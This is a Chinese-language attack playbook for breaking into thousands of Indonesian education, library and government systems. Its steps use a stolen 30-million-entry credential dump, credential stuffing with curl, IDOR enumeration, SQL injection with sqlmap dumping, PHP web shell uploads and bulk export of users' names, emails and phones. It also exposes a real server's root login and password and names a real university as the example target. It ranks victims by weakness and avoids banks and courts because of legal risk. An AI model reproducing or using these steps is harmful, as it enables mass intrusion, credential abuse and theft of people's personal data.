# 🎯 手动精准攻击指南（避免误报）

> **理念**: 手动验证每一步，确保真实可利用
> **目标**: 2,947个大数据系统
> **凭证库**: 30,778,956条

---

## 📋 完整攻击流程（手动验证）

```
第1步: 选择目标
  ↓
第2步: 提取精准凭证（从30M库中）
  ↓
第3步: 手动凭证填充
  ↓
第4步: 登录成功 → 深度利用
  ├─ IDOR测试
  ├─ SQL注入
  ├─ 文件上传
  ├─ 未授权接口
  └─ API数据导出
  ↓
第5步: 数据提取和保存
```

---

## 🎯 第1步：选择目标

### 推荐从学生系统开始（成功率最高）

```bash
# 登录服务器
ssh -p 2233 root@82.29.71.156
# 密码: @admin1314@

# 查看学生系统列表（1,123个）
cd /root
head -50 indonesia_student_systems.txt

# 选择一个目标（复制URL）
# 例如: https://academic.itekes-bali.ac.id
```

**推荐目标类型**：
- ✅ 学生系统（1,123个）- 防护最弱
- ✅ 图书馆系统（274个）- 数据量大
- ⚠️ 避开：司法/海关/金融（风险极高）

---

## 🔍 第2步：精准提取凭证

### 方法1：提取该域名的所有凭证

```bash
# 设置目标
TARGET="academic.itekes-bali.ac.id"

# 从30M凭证库中精准提取该域名的凭证
grep "$TARGET" /root/sqll/id\ \(2\).txt > /tmp/target_creds.txt

# 查看找到多少条
wc -l /tmp/target_creds.txt

# 查看前10条
head -10 /tmp/target_creds.txt
```

**格式**: `URL:用户名:密码`

---

### 方法2：如果没有精准匹配，查找主域名

```bash
# 提取主域名
MAIN_DOMAIN=$(echo $TARGET | awk -F/ '{print $3}' | sed 's/^[^.]*\.//')
# 例如: itekes-bali.ac.id

# 搜索主域名
grep "$MAIN_DOMAIN" /root/sqll/id\ \(2\).txt > /tmp/target_creds.txt

# 查看结果
wc -l /tmp/target_creds.txt
head -10 /tmp/target_creds.txt
```

---

### 方法3：如果还是没有，使用通用凭证

```bash
# 创建常见弱口令列表
cat > /tmp/weak_creds.txt << 'EOF'
admin:admin
admin:password
admin:123456
admin:admin123
test:test
demo:demo
guest:guest
user:user
mahasiswa:mahasiswa
siswa:siswa
EOF
```

---

## 🔑 第3步：手动凭证填充

### 3.1 先手动访问目标，找登录页

```bash
TARGET="https://academic.itekes-bali.ac.id"

# 访问主页，查看跳转
curl -sLI "$TARGET" | grep -i "location"

# 尝试常见登录路径
curl -s "$TARGET/login" | grep -i "login\|username\|password"
curl -s "$TARGET/admin/login" | grep -i "login\|username\|password"
```

**手动确认**：
- 用浏览器打开找到的登录页
- 查看登录表单的字段名（可能是username/email/user）

---

### 3.2 提取表单字段名

```bash
# 查看登录表单
curl -s "$TARGET/login" > /tmp/login_page.html

# 提取input字段
grep -o '<input[^>]*' /tmp/login_page.html | grep -E 'name=|type='

# 通常是：
# - username / user / email / nim
# - password / pass / passwd
```

---

### 3.3 手动测试第一个凭证

```bash
# 从凭证文件中提取第一条
FIRST_CRED=$(head -1 /tmp/target_creds.txt)
URL=$(echo $FIRST_CRED | cut -d':' -f1)
USER=$(echo $FIRST_CRED | cut -d':' -f2)
PASS=$(echo $FIRST_CRED | cut -d':' -f3)

echo "测试凭证: $USER:$PASS"

# 手动POST登录（根据实际表单字段调整）
curl -sk "$TARGET/login" \
  -X POST \
  -d "username=$USER&password=$PASS" \
  -c /tmp/cookies.txt \
  -v 2>&1 | grep -E "Set-Cookie|Location|HTTP"

# 检查是否有Session Cookie
cat /tmp/cookies.txt
```

---

### 3.4 验证是否真正登录成功

```bash
# 使用获取的Cookie访问后台
curl -sk "$TARGET/dashboard" -b /tmp/cookies.txt > /tmp/dashboard.html

# 手动检查（避免误报）
grep -i "logout\|welcome\|dashboard\|admin" /tmp/dashboard.html

# 或者用浏览器验证
echo "用浏览器打开目标，手动设置Cookie验证"
cat /tmp/cookies.txt
```

**✅ 真正成功的标志**：
- 返回dashboard/admin页面
- 页面显示用户名/欢迎信息
- 有logout按钮
- 能看到数据列表

**❌ 误报的标志**：
- 又跳转回登录页
- 返回403/401
- 页面显示"请登录"

---

## 🎯 第4步：登录成功后的深度利用

### 4.1 IDOR测试（越权访问）

```bash
# 手动测试IDOR（逐个验证）
# 常见模式：/api/user/{id} 或 /profile?id={id}

# 测试1：查看自己的ID
curl -sk "$TARGET/api/user/1" -b /tmp/cookies.txt | jq .

# 测试2：修改ID看能否访问别人
for id in 2 3 10 100; do
  echo "测试ID: $id"
  curl -sk "$TARGET/api/user/$id" -b /tmp/cookies.txt | jq . | head -20
  echo "---"
done

# ✅ 真正的IDOR：能看到其他用户的email/phone/身份证
# ❌ 误报：返回空/403/自己的数据
```

**手动验证**：
```bash
# 如果发现IDOR，批量导出（小心流量）
mkdir -p /root/attack_results/idor_data

for id in {1..100}; do
  curl -sk "$TARGET/api/user/$id" -b /tmp/cookies.txt \
    >> /root/attack_results/idor_data/users.json 2>/dev/null
  sleep 0.5  # 延时避免被ban
done

# 查看获取了多少数据
cat /root/attack_results/idor_data/users.json | jq . | grep -i "email\|name" | wc -l
```

---

### 4.2 SQL注入测试（手动验证）

```bash
# 找一个带参数的页面
# 例如：/view?id=1 或 /search?q=test

# 测试单引号
curl -sk "$TARGET/view?id=1'" -b /tmp/cookies.txt > /tmp/sqli_test1.html

# 手动检查SQL错误（真正的注入）
grep -i "mysql\|sql\|syntax\|error\|warning" /tmp/sqli_test1.html

# ✅ 真正的SQL注入：
# - MySQL error: You have an error in your SQL syntax
# - Warning: mysqli_query()
# - SQLSTATE[42000]

# ❌ 误报：
# - 通用错误页面
# - 404/403
# - 参数过滤提示
```

**手动注入测试**：
```bash
# 如果确认有注入，手动测试
URL_PARAM="$TARGET/view?id=1"

# 布尔盲注测试
curl -sk "${URL_PARAM}' AND '1'='1" -b /tmp/cookies.txt > /tmp/true.html
curl -sk "${URL_PARAM}' AND '1'='2" -b /tmp/cookies.txt > /tmp/false.html

# 比较两个响应
diff /tmp/true.html /tmp/false.html

# 如果有明显差异 → 确认SQL盲注
```

**使用sqlmap（仅在确认后）**：
```bash
# 确认有注入后才用sqlmap
sqlmap -u "$URL_PARAM" \
  --cookie="$(cat /tmp/cookies.txt | grep -v '#' | awk '{print $6"="$7}' | tr '\n' ';')" \
  --batch --level=2 --risk=2 \
  --threads=5 \
  --dump \
  --output-dir=/root/attack_results/sqlmap
```

---

### 4.3 文件上传测试

```bash
# 查找上传页面
curl -sk "$TARGET/upload" -b /tmp/cookies.txt | grep -i "upload\|file"
curl -sk "$TARGET/admin/upload" -b /tmp/cookies.txt | grep -i "upload\|file"

# 创建测试文件
echo "<?php phpinfo(); ?>" > /tmp/test.php
echo "GIF89a<?php phpinfo(); ?>" > /tmp/shell.gif

# 手动上传（根据实际表单调整）
curl -sk "$TARGET/upload" -b /tmp/cookies.txt \
  -F "file=@/tmp/test.php" \
  -F "submit=Upload" \
  > /tmp/upload_response.html

# 手动检查响应
grep -i "success\|uploaded\|url\|path" /tmp/upload_response.html

# ✅ 真正成功：返回文件URL
# ❌ 误报：返回"不允许的文件类型"
```

**验证上传的文件**：
```bash
# 从响应中提取文件路径
UPLOADED_FILE=$(grep -o "uploads/[^\"'<> ]+" /tmp/upload_response.html | head -1)

# 访问上传的文件
curl -sk "$TARGET/$UPLOADED_FILE"

# 如果返回phpinfo页面 → 成功GetShell
```

---

### 4.4 未授权接口测试

```bash
# 退出登录，测试未授权访问
rm /tmp/cookies.txt

# 测试常见API端点
curl -sk "$TARGET/api/users" | jq . | head -20
curl -sk "$TARGET/api/data" | jq . | head -20
curl -sk "$TARGET/api/students" | jq . | head -20

# ✅ 真正的未授权：返回用户/数据列表
# ❌ 误报：返回401/403/空数据
```

---

### 4.5 API批量数据导出

```bash
# 如果发现可访问的API
curl -sk "$TARGET/api/users" -b /tmp/cookies.txt > /tmp/api_test.json

# 检查返回的数据
cat /tmp/api_test.json | jq . | head -50

# 如果是数组，批量导出
curl -sk "$TARGET/api/users?page=1&limit=1000" -b /tmp/cookies.txt \
  > /root/attack_results/api_export.json

# 提取关键信息
cat /root/attack_results/api_export.json | jq -r '.[] | [.name, .email, .phone] | @csv' \
  > /root/attack_results/users.csv

# 查看导出了多少条
wc -l /root/attack_results/users.csv
```

---

## 📊 第5步：数据提取和保存

### 5.1 结构化保存

```bash
# 为每个成功的目标创建目录
DOMAIN=$(echo $TARGET | awk -F/ '{print $3}')
mkdir -p /root/attack_results/$DOMAIN

# 保存凭证
echo "$USER:$PASS" > /root/attack_results/$DOMAIN/credentials.txt

# 保存Cookie
cp /tmp/cookies.txt /root/attack_results/$DOMAIN/

# 保存导出的数据
mv /root/attack_results/idor_data/* /root/attack_results/$DOMAIN/ 2>/dev/null
mv /root/attack_results/api_export.json /root/attack_results/$DOMAIN/ 2>/dev/null

# 创建摘要
cat > /root/attack_results/$DOMAIN/summary.txt << EOF
目标: $TARGET
凭证: $USER:$PASS
攻破时间: $(date)
攻击向量:
  - 凭证填充: ✅
  - IDOR: $([ -f /root/attack_results/$DOMAIN/users.json ] && echo "✅" || echo "❌")
  - SQL注入: ❌
  - 文件上传: ❌
  - API导出: $([ -f /root/attack_results/$DOMAIN/api_export.json ] && echo "✅" || echo "❌")

导出数据:
  - 用户数: $(cat /root/attack_results/$DOMAIN/*.json 2>/dev/null | grep -c "email")
  
EOF

cat /root/attack_results/$DOMAIN/summary.txt
```

---

### 5.2 汇总所有成功的目标

```bash
# 创建总体成功列表
cat > /root/attack_results/SUCCESS_LIST.txt << 'EOF'
═══════════════════════════════════════════════════════════════════════════════
🎯 成功攻破的目标列表
═══════════════════════════════════════════════════════════════════════════════

EOF

# 列出所有成功的目标
ls -d /root/attack_results/*/ | while read dir; do
  if [ -f "$dir/credentials.txt" ]; then
    domain=$(basename $dir)
    creds=$(cat $dir/credentials.txt)
    echo "✅ $domain | $creds" >> /root/attack_results/SUCCESS_LIST.txt
  fi
done

# 查看
cat /root/attack_results/SUCCESS_LIST.txt
```

---

## 🎯 完整示例：攻击一个目标

```bash
# ═══════════════════════════════════════════════════════════════════════════════
# 完整手动攻击示例
# ═══════════════════════════════════════════════════════════════════════════════

# 1. 选择目标
TARGET="https://academic.itekes-bali.ac.id"

# 2. 提取凭证
grep "itekes-bali.ac.id" /root/sqll/id\ \(2\).txt > /tmp/target_creds.txt
echo "找到 $(wc -l < /tmp/target_creds.txt) 条凭证"

# 3. 测试第一个凭证
USER=$(head -1 /tmp/target_creds.txt | cut -d':' -f2)
PASS=$(head -1 /tmp/target_creds.txt | cut -d':' -f3)

echo "测试: $USER:$PASS"

curl -sk "$TARGET/login" \
  -X POST \
  -d "username=$USER&password=$PASS" \
  -c /tmp/cookies.txt \
  -L > /tmp/login_result.html

# 4. 手动验证登录成功
grep -i "dashboard\|logout\|welcome" /tmp/login_result.html

# 5. 如果成功，测试IDOR
curl -sk "$TARGET/api/users" -b /tmp/cookies.txt | jq . | head -20

# 6. 导出数据
for id in {1..100}; do
  curl -sk "$TARGET/api/user/$id" -b /tmp/cookies.txt >> /tmp/users.json
  sleep 0.5
done

# 7. 保存结果
DOMAIN=$(echo $TARGET | awk -F/ '{print $3}')
mkdir -p /root/attack_results/$DOMAIN
echo "$USER:$PASS" > /root/attack_results/$DOMAIN/credentials.txt
mv /tmp/users.json /root/attack_results/$DOMAIN/

echo "✅ 攻击完成！数据保存在: /root/attack_results/$DOMAIN/"
```

---

## 📋 快捷命令速查

### 提取凭证
```bash
TARGET="目标域名"
grep "$TARGET" /root/sqll/id\ \(2\).txt > /tmp/creds.txt
```

### 测试登录
```bash
curl -sk "https://$TARGET/login" -X POST \
  -d "username=用户名&password=密码" \
  -c /tmp/cookies.txt -v
```

### 测试IDOR
```bash
curl -sk "https://$TARGET/api/user/1" -b /tmp/cookies.txt | jq .
```

### 测试API
```bash
curl -sk "https://$TARGET/api/users" -b /tmp/cookies.txt | jq . | head
```

### 批量导出
```bash
for id in {1..100}; do
  curl -sk "https://$TARGET/api/user/$id" -b /tmp/cookies.txt
  sleep 0.5
done > /tmp/data.json
```

---

## ⚠️ 避免误报的关键点

1. **登录验证**：
   - ✅ 必须看到dashboard/用户名/logout
   - ❌ 不要相信HTTP 200就是成功

2. **IDOR验证**：
   - ✅ 必须看到不同的email/phone
   - ❌ 不要因为返回数据就判断成功

3. **SQL注入验证**：
   - ✅ 必须看到真正的SQL错误信息
   - ❌ 不要把404/500当成注入

4. **上传验证**：
   - ✅ 必须能访问上传的文件
   - ❌ 不要相信"上传成功"提示

5. **API验证**：
   - ✅ 必须返回真实的用户数据
   - ❌ 不要把空数组当成成功

---

## 🎯 推荐攻击顺序

```
1. 学生系统（1,123个）  → 凭证填充成功率40-50%
2. 图书馆系统（274个）  → 防护较弱
3. 档案系统（334个）    → 数据价值高
4. 人事系统（326个）    → 需要更多技巧
5. 其他系统...

⚠️ 避开：
  - 司法/法院（136个）- 法律风险极高
  - 海关/移民（13个）- 国家安全级
  - 银行/金融（60个）- 金融犯罪
```

---

**手动攻击才能确保精准！慢即是快！** 🎯
